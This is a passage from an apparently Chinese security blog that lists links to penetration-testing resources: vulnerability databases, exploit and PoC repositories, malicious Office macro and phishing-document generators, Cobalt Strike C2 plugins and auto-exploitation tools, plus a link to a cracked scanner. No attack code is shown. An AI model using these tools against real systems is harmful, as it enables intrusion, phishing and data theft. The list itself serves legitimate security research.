公开漏洞详情文章</span><br><span class="line">https://sec.ly.com/bugs 同程安全公开漏洞详情文章</span><br><span class="line">http://ics.cnvd.org.cn 中国国家工控漏洞库</span><br><span class="line">https://ics-cert.us-cert.gov/advisories 美国国家工控漏洞库</span><br><span class="line">http://www.nsfocus.net/index.php?act=sec_bug 绿盟漏洞库，含工控</span><br><span class="line">http://ivd.winicssec.com/ 威努特工控漏洞库</span><br><span class="line">http://cve.scap.org.cn/view/ics CVE中文工控漏洞库</span><br><span class="line">https://cve.mitre.org/cve/search_cve_list.html 美国MITRE公司负责维护的CVE漏洞库</span><br><span class="line">https://www.exploit-db.com 美国Offensive Security的漏洞库</span><br><span class="line">https://nvd.nist.gov/vuln/search 美国国家信息安全漏洞库</span><br></pre></td></tr></table></figure><h2 id="工具包集合"><a href="#工具包集合" class="headerlink" title="工具包集合"></a><strong>工具包集合</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http://www.4hou.com/web/11241.html 史上最全攻击模拟工具盘点</span><br><span class="line">https://github.com/infosecn1nja/Red-Teaming-Toolkit 信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、清理痕迹</span><br><span class="line">https://github.com/toolswatch/blackhat-arsenal-tools 黑帽大会工具集</span><br><span class="line">https://www.cnblogs.com/k8gege K8哥哥工具包集合。解压密码Kk8team,Kk8gege</span><br><span class="line">https://github.com/n00py/ReadingList/blob/master/gunsafe.txt 安全工具集</span><br><span class="line">https://github.com/Ridter/Pentest 安全工具集</span><br><span class="line">https://github.com/redcanaryco/atomic-red-team win、linux、mac等多方面apt利用手段、技术与工具集</span><br><span class="line">https://github.com/Cooolis/Cooolis.github.io Cooolis是一个操作系统命令技巧备忘录，https://cooolis.payloads.online</span><br><span class="line">https://github.com/LOLBAS-Project/LOLBAS 常见的渗透测试利用的脚本与二进制文件集合</span><br><span class="line">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip csrf验证工具</span><br><span class="line">https://github.com/ufrisk/MemProcFS 以访问文件系统的方式访问物理内存, 可读写, 有易于使用的接口. 当前支持Windows</span><br><span class="line">https://github.com/vletoux/SpoolerScanner 检测 Windows 远程打印机服务是否开启的工具</span><br><span class="line">https://github.com/sirpsycho/firecall 直接向CiscoASA防火墙发送命令, 无需登录防火墙后再做修改</span><br><span class="line">https://github.com/jboss-javassist/javassist 能够操作字节码框架，通过它我们能很轻易的修改class代码文件</span><br><span class="line">https://github.com/ConsenSys/mythril-classic 用于以太坊智能协议的安全分析工具</span><br><span class="line">https://github.com/a13xp0p0v/kconfig-hardened-check 用于检查 Linux 内核配置中的安全加固选项的脚本</span><br><span class="line">https://github.com/lionsoul2014/ip2region ip地址定位库，支持python3等多接口。类比geoip</span><br><span class="line">https://github.com/m101/hsploit 基于rust的HEVD 漏洞利用程序</span><br><span class="line">https://github.com/ticarpi/jwt_tool 针对json web token的检测</span><br><span class="line">https://github.com/clr2of8/DPAT 域密码配置审计</span><br><span class="line">https://github.com/chenjj/CORScanner 域解析漏洞，跨域扫描器</span><br><span class="line">https://github.com/dienuet/crossdomain 域解析漏洞，跨域扫描器</span><br><span class="line">https://github.com/sfan5/fi6s ipv6端口快速扫描器</span><br><span class="line">https://github.com/lavalamp-/ipv666 go,ipv6地址枚举扫描</span><br><span class="line">https://github.com/commixproject/commix 命令注入漏洞扫描</span><br><span class="line">https://github.com/Graph-X/davscan DAVScan是一款快速轻便的webdav扫描仪，旨在发现DAV启用的Web服务器上的隐藏文件和文件夹</span><br><span class="line">https://github.com/jcesarstef/dotdotslash 目录遍历漏洞测试</span><br><span class="line">https://github.com/P3GLEG/WhaleTail 根据docker镜像生成成dockerfile</span><br><span class="line">https://github.com/cr0hn/dockerscan docker扫描工具</span><br><span class="line">https://github.com/utiso/dorkbot 通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描</span><br><span class="line">https://github.com/NullArray/DorkNet 基于搜索引擎的漏洞网页搜寻</span><br><span class="line">https://github.com/panda-re/lava 大规模向程序中植入恶意程序</span><br><span class="line">https://github.com/woj-ciech/Danger-zone 关联域名、IP 和电子邮件地址之间的数据并将其可视化输出</span><br><span class="line">https://github.com/securemode/DefenderKeys 枚举出被 Windows Defender 排除扫描的配置</span><br><span class="line">https://github.com/D4Vinci/PasteJacker 剪贴板劫持利用工具</span><br><span class="line">https://github.com/JusticeRage/freedomfighting 日志清理、文件共享、反向shell、简单爬虫工具包</span><br><span class="line">https://github.com/gh0stkey/PoCBox 漏洞测试验证辅助平台，SONP劫持、CORS、Flash跨域资源读取、Google Hack语法生成、URL测试字典生成、JavaScript URL跳转、302 URL跳转</span><br><span class="line">https://github.com/jakubroztocil/httpie http调试工具，类似curl，功能更完善</span><br><span class="line">https://www.getpostman.com/ http调试工具，带界面</span><br></pre></td></tr></table></figure><h2 id="漏洞收集与Exp、Poc利用"><a href="#漏洞收集与Exp、Poc利用" class="headerlink" title="漏洞收集与Exp、Poc利用"></a><strong>漏洞收集与Exp、Poc利用</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Lcys/Python_PoC python3的poc、exp快速编写模板，有众多模范版本</span><br><span class="line">https://github.com/raminfp/linux_exploit_development linux漏洞利用开发手册</span><br><span class="line">https://github.com/mudongliang/LinuxFlaw 包含linux下软件漏洞列表</span><br><span class="line">https://github.com/coffeehb/Some-PoC-oR-ExP 各种漏洞poc、Exp的收集或编写</span><br><span class="line">https://github.com/userlandkernel/plataoplomo Sem Voigtländer 公开其发现的 iOS 中各种漏洞，包括（Writeup/POC/Exploit）</span><br><span class="line">https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py CVE-2018-4407，macos/ios缓冲区溢出可导致系统崩溃</span><br><span class="line">https://github.com/vulnersCom/getsploit py2,仿照searchsploit通过各种数据库的官方接口进行payload的查找</span><br><span class="line">https://github.com/SecWiki/CMS-Hunter CMS漏洞测试用例集合</span><br><span class="line">https://github.com/Mr5m1th/0day 各种开源CMS 各种版本的漏洞以及EXP</span><br><span class="line">https://github.com/w1109790800/penetration CMS新老版本exp与系统漏洞搜集表</span><br><span class="line">https://github.com/blacknbunny/libSSH-Authentication-Bypass CVE-2018-10933，libssh服务端身份验证绕过</span><br><span class="line">https://github.com/leapsecurity/libssh-scanner CVE-2018-10933，libssh服务端身份验证绕过</span><br><span class="line">https://github.com/anbai-inc/CVE-2018-4878 Adobe Flash Exploit生成payload</span><br><span class="line">https://github.com/RetireJS/grunt-retire 扫描js扩展库的常见漏洞</span><br><span class="line">https://github.com/coffeehb/SSTIF 服务器端模板注入漏洞的半自动化工具</span><br><span class="line">https://github.com/tijme/angularjs-csti-scanner 探测客户端AngularJS模板注入漏洞工具</span><br><span class="line">https://github.com/blackye/Jenkins Jenkins漏洞探测、用户抓取爆破</span><br><span class="line">https://github.com/epinna/tplmap 服务器端模板注入漏洞检测与利用工具</span><br><span class="line">https://github.com/irsdl/IIS-ShortName-Scanner Java,IIS短文件名暴力枚举漏洞利用工具</span><br><span class="line">https://github.com/lijiejie/IIS_shortname_Scanner py2,IIS短文件名漏洞扫描</span><br><span class="line">https://github.com/rudSarkar/crlf-injector CRLF注入漏洞批量扫描</span><br><span class="line">https://github.com/hahwul/a2sv SSL漏洞扫描，例如心脏滴血漏洞等</span><br><span class="line">https://github.com/jagracey/Regex-DoS RegEx拒绝服务扫描器</span><br><span class="line">https://github.com/Bo0oM/PHP_imap_open_exploit 利用imap_open绕过php exec函数禁用</span><br><span class="line">https://www.anquanke.com/post/id/106488 利用mysql服务端恶意配置读取客户端文件，（如何利用MySQL LOCAL INFILE读取客户端文件，Read MySQL Client&apos;s File，【技术分享】从MySQL出发的反击之路）</span><br><span class="line">https://www.waitalone.cn/awvs-poc.html CVE-2015-4027，AWVS10命令执行漏洞</span><br><span class="line">http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html Pwn the n00bs - Acunetix 0day，awvs8命令执行漏洞</span><br><span class="line">https://github.com/numpy/numpy/issues/12759 科学计算框架numpy命令执行RCE漏洞</span><br><span class="line">https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC jenkins远程命令执行</span><br><span class="line">https://github.com/WyAtu/CVE-2018-20250 WinRar执行漏洞加使用介绍</span><br></pre></td></tr></table></figure><h2 id="物联网路由工控漏洞收集"><a href="#物联网路由工控漏洞收集" class="headerlink" title="物联网路由工控漏洞收集"></a><strong>物联网路由工控漏洞收集</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/yassineaboukir/CVE-2018-0296 测试思科ASA路径穿越漏洞，可获取系统详细信息</span><br><span class="line">https://github.com/seclab-ucr/tcp_exploit 利用tcp漏洞使无线路由器产生隐私泄露</span><br><span class="line">https://github.com/ezelf/CVE-2018-9995_dvr_credentials CVE-2018-9995摄像头路由，Get DVR Credentials</span><br></pre></td></tr></table></figure><h2 id="Java反序列化漏洞收集"><a href="#Java反序列化漏洞收集" class="headerlink" title="Java反序列化漏洞收集"></a><strong>Java反序列化漏洞收集</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/brianwrf/hackUtils java反序列化利用</span><br><span class="line">https://github.com/GoSecure/break-fast-serial 借助DNS解析来检测Java反序列化漏洞工具</span><br><span class="line">https://github.com/s1kr10s/Apache-Struts-v3 Apache-Struts漏洞利用工具</span><br><span class="line">https://github.com/iBearcat/S2-057 struts2 CVE-2018-11776 漏洞检测工具</span><br><span class="line">https://github.com/Ivan1ee/struts2-057-exp struts2-057利用脚本</span><br><span class="line">https://github.com/theLSA/s2sniper struts2漏洞的检测工具</span><br><span class="line">https://github.com/Lucifer1993/struts-scan 批量检测struts命令执行漏洞</span><br><span class="line">https://github.com/lijiejie/struts2_045_scan Struts2-045漏洞批量扫描工具</span><br><span class="line">https://github.com/riusksk/StrutScan 基于perl的strut2的历史漏洞扫描</span><br><span class="line">https://github.com/Coalfire-Research/java-deserialization-exploits java反序列化漏洞收集</span><br><span class="line">https://github.com/quentinhardy/jndiat weblogic漏洞利用工具</span><br><span class="line">https://github.com/jas502n/CVE-2018-3191 Weblogic CVE-2018-3191远程代码命令执行</span><br><span class="line">https://github.com/pyn3rd/CVE-2018-3245 weblogic cve-2018-2893与cve-2018-3245远程代码命令执行</span><br><span class="line">https://github.com/NickstaDB/BaRMIe 用于Java Remote Method Invocation服务的工具/rmi的枚举与远程命令执行</span><br><span class="line">https://github.com/joaomatosf/jexboss JBoss和其他java序列化漏洞验证和开发工具</span><br><span class="line">https://github.com/frohoff/ysoserial java反序列化利用工具</span><br></pre></td></tr></table></figure><h2 id="版本管理平台漏洞收集"><a href="#版本管理平台漏洞收集" class="headerlink" title="版本管理平台漏洞收集"></a><strong>版本管理平台漏洞收集</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shengqi158/svnhack .svn文件夹泄漏利用工具</span><br><span class="line">https://www.waitalone.cn/seay-svn-poc-donw-20140505.html Seay-Svn源代码泄露漏洞利用工具，2014-05-05版</span><br><span class="line">https://github.com/BugScanTeam/GitHack .git文件利用工具，lijiejie改进版</span><br><span class="line">https://github.com/lijiejie/GitHack .git文件利用工具</span><br></pre></td></tr></table></figure><h2 id="MS与Office漏洞收集"><a href="#MS与Office漏洞收集" class="headerlink" title="MS与Office漏洞收集"></a><strong>MS与Office漏洞收集</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Lz1y/CVE-2017-8759 .NET Framework换行符漏洞，CVE-2017-8759完美复现（另附加hta+powershell弹框闪烁解决方案）https://www.freebuf.com/vuls/147793.html</span><br><span class="line">https://github.com/WyAtu/CVE-2018-8581 Exchange使用完成添加收信规则的操作进行横向渗透和提权漏洞</span><br><span class="line">https://github.com/dafthack/MailSniper PS,用于在Microsoft Exchange环境搜索电子邮件查找特定邮件（密码、网络架构信息等）</span><br><span class="line">https://github.com/sensepost/ruler GO,通过MAPI / HTTP或RPC / HTTP协议远程与Exchange服务器进行交互,通过客户端Outlook功能远程获取shell</span><br><span class="line">https://github.com/3gstudent/Smbtouch-Scanner 扫描内网永恒之蓝ETERNAL445SMB系列漏洞</span><br><span class="line">https://github.com/smgorelik/Windows-RCE-exploits windows命令执行RCE漏洞POC样本，分为web与文件两种形式</span><br><span class="line">https://github.com/3gstudent/CVE-2017-8464-EXP CVE-2017-8464，win快捷方式远程执行漏洞</span><br><span class="line">https://github.com/Lz1y/CVE-2018-8420 Windows的msxml解析器漏洞可以通过ie或vbs执行后门</span><br><span class="line">https://www.anquanke.com/post/id/163000 利用Excel 4.0宏躲避杀软检测的攻击技术分析</span><br><span class="line">https://github.com/BuffaloWill/oxml_xxe XXE漏洞利用</span><br><span class="line">https://thief.one/2017/06/20/1/ 浅谈XXE漏洞攻击与防御</span><br><span class="line">https://github.com/thom-s/docx-embeddedhtml-injection word2016，滥用Word联机视频特征执行恶意代码poc</span><br><span class="line">https://blog.cymulate.com/abusing-microsoft-office-online-video word2016，滥用Word联机视频特征执行恶意代码介绍</span><br><span class="line">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads 无需开启宏即可在word文档中利用DDE执行命令</span><br><span class="line">http://www.freebuf.com/articles/terminal/150285.html 无需开启宏即可在word文档中利用DDE执行命令利用</span><br><span class="line">https://github.com/Ridter/CVE-2017-11882 利用word文档RTF获取shell，https://evi1cg.me/archives/CVE_2017_11882_exp.html</span><br><span class="line">https://github.com/Lz1y/CVE-2017-8759 利用word文档hta获取shell，http://www.freebuf.com/vuls/147793.html</span><br><span class="line">https://fuping.site/2017/04/18/CVE-2017-0199漏洞复现过程 WORD RTF 文档，配合msf利用</span><br><span class="line">https://github.com/tezukanice/Office8570 利用ppsx幻灯片远程命令执行，https://github.com/rxwx/CVE-2017-8570</span><br><span class="line">https://github.com/0x09AL/CVE-2018-8174-msf 目前支持的版本是 32 位 IE 浏览器和 32 位 office。网页访问上线，浏览器关闭，shell 依然存活，http://www.freebuf.com/vuls/173727.html</span><br><span class="line">http://www.4hou.com/technology/9405.html 在 Office 文档的属性中隐藏攻击载荷</span><br><span class="line">https://evi1cg.me/archives/Create_PPSX.html 构造PPSX钓鱼文件</span><br><span class="line">https://github.com/enigma0x3/Generate-Macro PowerShell脚本，生成含有恶意宏的Microsoft Office文档</span><br><span class="line">https://github.com/mwrlabs/wePWNise 生成独立于体系结构的VBA代码，用于Office文档或模板，并自动绕过应用程序控制</span><br><span class="line">https://github.com/curi0usJack/luckystrike 基于ps，用于创建恶意的Office宏文档</span><br><span class="line">https://github.com/sevagas/macro_pack MS Office文档、VBS格式、快捷方式payload捆绑</span><br><span class="line">https://github.com/khr0x40sh/MacroShop 一组通过Office宏传递有效载荷的脚本</span><br></pre></td></tr></table></figure><h2 id="相关工具拓展插件"><a href="#相关工具拓展插件" class="headerlink" title="相关工具拓展插件"></a><strong>相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSword-Store/ 中国蚁剑插件市场</span><br></pre></td></tr></table></figure><h2 id="Kali环境下拓展插件"><a href="#Kali环境下拓展插件" class="headerlink" title="Kali环境下拓展插件"></a><strong>Kali环境下拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secforce/sparta py，图形化应用程序联动Nmap、Nikto、Hydra等工具</span><br><span class="line">https://github.com/Manisso/fsociety linux下类似于kali的工具包一键安装工具</span><br><span class="line">https://github.com/LionSec/katoolin 使用linux服务器自动安装kali工具包</span><br><span class="line">https://github.com/skavngr/rapidscan py2，simple，联动kali下工具，漏洞扫描工具</span><br><span class="line">https://github.com/koenbuyens/kalirouter 将kali设置为一个路由流量分析系统</span><br></pre></td></tr></table></figure><h2 id="Nessus相关工具拓展插件"><a href="#Nessus相关工具拓展插件" class="headerlink" title="Nessus相关工具拓展插件"></a><strong>Nessus相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.tenable.com/downloads/nessus</span><br><span class="line">https://github.com/se55i0n/Awvs_Nessus_Scanner_API 扫描器Awvs 11和Nessus 7 Api利用脚本</span><br><span class="line">https://github.com/DanMcInerney/msf-autoshell 配合nessus扫描结果进行msf攻击</span><br><span class="line">https://github.com/MooseDojo/apt2 联动nmap、nessus等工具进行安全测试</span><br></pre></td></tr></table></figure><h2 id="Awvs相关工具拓展插件"><a href="#Awvs相关工具拓展插件" class="headerlink" title="Awvs相关工具拓展插件"></a><strong>Awvs相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-214819-1-1.html awvs10.5开发框架破解版</span><br><span class="line">https://github.com/fnmsd/awvs_script_decode awvs10.5规则scripts解密版，SDK，开发手册</span><br><span class="line">https://github.com/NS-Sp4ce/AWVS11.X-Chinese-Version awvs11汉化包</span><br></pre></td></tr></table></figure><h2 id="Burpsuit相关工具拓展插件"><a href="#Burpsuit相关工具拓展插件" class="headerlink" title="Burpsuit相关工具拓展插件"></a><strong>Burpsuit相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PortSwigger burpsuite官方插件库</span><br><span class="line">https://github.com/snoopysecurity/awesome-burp-extensions awesome系列之burp拓展</span><br><span class="line">https://github.com/d3vilbug/HackBar 集成hackbar</span><br><span class="line">https://github.com/PortSwigger/turbo-intruder 比Burp自带的Intruder 更快，一分钟打1.61万次请求</span><br><span class="line">https://github.com/Ebryx/AES-Killer burp插件，破解aes加密的插件</span><br><span class="line">https://github.com/bugcrowd/HUNT 可以将burpsuite扫描器功能扩展的更加强大，同时支持zapproxy扩展</span><br><span class="line">https://github.com/wagiro/BurpBounty burp插件增强主动与被动扫描功能</span><br><span class="line">https://github.com/nccgroup/BurpSuiteHTTPSmuggler Burp拓展, 使用几种技巧绕过WAF</span><br><span class="line">https://github.com/PortSwigger/command-injection-attacker burp插件，命令注入漏洞检测</span><br><span class="line">https://github.com/nccgroup/freddy burp插件，自动识别Java/.NET 应用程序中的反序列化漏洞</span><br><span class="line">https://github.com/modzero/interestingFileScanner burp插件，增强敏感文件扫描</span><br><span class="line">https://github.com/summitt/Burp-Non-HTTP-Extension burp插件，布置dns服务器抓取流量</span><br><span class="line">https://github.com/ilmila/J2EEScan burp拓展，扫描J2EE应用</span><br><span class="line">https://github.com/JGillam/burp-co2 集成了sqlmap，菜刀，字典生成等</span><br><span class="line">https://github.com/swisskyrepo/SSRFmap burp插件，检测ssrf漏洞</span><br></pre></td></tr></table></figure><h2 id="Sqlmap相关工具拓展插件"><a href="#Sqlmap相关工具拓展插件" class="headerlink" title="Sqlmap相关工具拓展插件"></a><strong>Sqlmap相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/codewatchorg/sqlipy burp与sqlmap联动插件</span><br><span class="line">https://github.com/Hood3dRob1n/SQLMAP-Web-GUI sqlmap的web gui</span><br><span class="line">https://github.com/KINGSABRI/sqlmap-tamper-api 利用各种语言来编写sqlmapTamper</span><br><span class="line">https://github.com/0xbug/SQLiScanner 一款基于sqlmapapi和Charles的被动SQL注入漏洞扫描工具</span><br><span class="line">https://github.com/fengxuangit/Fox-scan 基于sqlmapapi的主动和被动资源发现的漏洞扫描工具</span><br><span class="line">https://github.com/UltimateHackers/sqlmate 在sqlmap基础上增加了目录扫描、hash爆破等功能</span><br><span class="line">https://github.com/ysrc/GourdScanV2 ysrc出品的被动式漏洞扫描工具，基于sqlmapapi</span><br><span class="line">https://github.com/zt2/sqli-hunter 基于sqlmapapi，ruby编写的漏洞代理型检测工具</span><br><span class="line">https://github.com/jesuiscamille/AutoSQLi 利用DorkNet，Googler, Ddgr, WhatWaf 和 sqlmap自动注入</span><br></pre></td></tr></table></figure><h2 id="Nmap相关工具拓展插件"><a href="#Nmap相关工具拓展插件" class="headerlink" title="Nmap相关工具拓展插件"></a><strong>Nmap相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Ullaakut/nmap GO，实现的Nmap调用库</span><br><span class="line">https://github.com/cldrn/nmap-nse-scripts NSE收集列表</span><br><span class="line">https://github.com/vulnersCom/nmap-vulners 使用nmap扫描常见的服务漏洞</span><br><span class="line">https://github.com/s4n7h0/Halcyon Nmap Script (NSE)IDE编辑器</span><br><span class="line">https://github.com/m4ll0k/AutoNSE NSE自动化利用</span><br><span class="line">https://github.com/Screetsec/Dracnmap shell，将Nmap复杂的命令进行一定程度的集成与简化，使新用户更加容易上手。</span><br><span class="line">https://github.com/cldrn/rainmap-lite Django，Web版Nmap，可以建立新的扫描服务器，允许用户从他们的手机/平板电脑/网络浏览器启动Nmap扫描</span><br><span class="line">https://github.com/trimstray/sandmap linux下将支持使用大量 Nmap 引擎进行网络和系统侦察的工具</span><br><span class="line">https://github.com/m0nad/HellRaiser 基于nmap的扫描器，与cve漏洞关联</span><br><span class="line">https://github.com/scipag/vulscan 基于nmap的高级漏洞扫描器，命令行环境使用</span><br><span class="line">https://github.com/Rev3rseSecurity/WebMap 将nmap的xml web展示器</span><br><span class="line">https://github.com/DanMcInerney/msf-autopwn 执行NMap扫描或读取扫描结果, 然后自动使用msf攻击包含常见漏洞的主机</span><br></pre></td></tr></table></figure><h2 id="Metasploit相关工具拓展插件"><a href="#Metasploit相关工具拓展插件" class="headerlink" title="Metasploit相关工具拓展插件"></a><strong>Metasploit相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit 结合机器学习与msf的全自动测试工具</span><br><span class="line">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL 一个可以创建SSL/TLS shell连接的脚本</span><br><span class="line">https://github.com/DanMcInerney/msf-netpwn 等待msf的session，并自动提为域管理</span><br><span class="line">https://www.exploit-db.com/exploits/45851/ msf插件，利用jira upm上传进行命令执行</span><br><span class="line">https://github.com/NullArray/AutoSploit 利用Shodan 搜索引擎收集目标, 并自动调用设定的msf模块对目标发动攻击</span><br><span class="line">https://github.com/WazeHell/metateta 使用msf脚本，根据特定协议进行扫描</span><br><span class="line">https://github.com/fbkcs/msf-elf-in-memory-execution Metasploit模块, 用于在内存中执行ELF文件</span><br><span class="line">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit metasploit双星攻击利用文件</span><br><span class="line">https://github.com/darkoperator/Metasploit-Plugins msf扩展资产搜集与帮助插件</span><br><span class="line">https://github.com/D4Vinci/One-Lin3r metasploit、payload辅助查询工具</span><br><span class="line">https://github.com/shizzz477/msploitego 将msf数据库与maltego进行图形化展示</span><br><span class="line">https://github.com/scriptjunkie/msfgui metasploit的GUI界面，话说现在msf对windows支持也挺好的</span><br></pre></td></tr></table></figure><h2 id="CobaltStrike相关工具拓展插件"><a href="#CobaltStrike相关工具拓展插件" class="headerlink" title="CobaltStrike相关工具拓展插件"></a><strong>CobaltStrike相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg 使用Aggressor脚本雕饰Cobalt Strike</span><br><span class="line">https://github.com/rsmudge/armitage CobaltStrike社区版，调用msf，一对多带界面</span><br><span class="line">https://github.com/anbai-inc/CobaltStrike_Hanization CobaltStrike2.5汉化版，以msf库为基础，3.0以后改版</span><br><span class="line">https://github.com/rsmudge/cortana-scripts 用于cs2.x与armitage的可拓展插件，cvs3.x的为AggressorScripts</span><br><span class="line">https://github.com/harleyQu1nn/AggressorScripts cs3.0以后的脚本搜集</span><br><span class="line">https://github.com/FortyNorthSecurity/AggressorAssessor cs3.x自动化攻击脚本集合</span><br><span class="line">https://github.com/Ridter/CS_Chinese_support/ cs3.0传输信息的汉化插件</span><br><span class="line">https://github.com/verctor/CS_xor64 生成cobaltstrike所需的xor64.bin</span><br><span class="line">https://github.com/ryhanson/ExternalC2 一个用于将通信渠道与Cobalt Strike External C2服务器集成的库</span><br><span class="line">https://github.com/threatexpress/cs2modrewrite 用于将Cobalt Strike配置文件转换为mod_rewrite脚本的工具</span><br><span class="line">https://github.com/Mr-Un1k0d3r/CatMyFish 搜索分类域，为Cobalt Strike beacon C&amp;C设置白名单域</span><br><span class="line">https://github.com/threatexpress/malleable-c2 利用jquery文件进行C2通讯，在文件内做了JS混淆绕过防火墙</span><br><span class="line">https://github.com/dcsync/pycobalt py3,Python API for Cobalt Strike</span><br><span class="line">https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html CobaltStrike相关插件编写，一对多带界面</span><br></pre></td></tr></table></figure><h2 id="Empire相关工具拓展插件"><a href="#Empire相关工具拓展插件" class="headerlink" title="Empire相关工具拓展插件"></a><strong>Empire相关工具拓展插件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 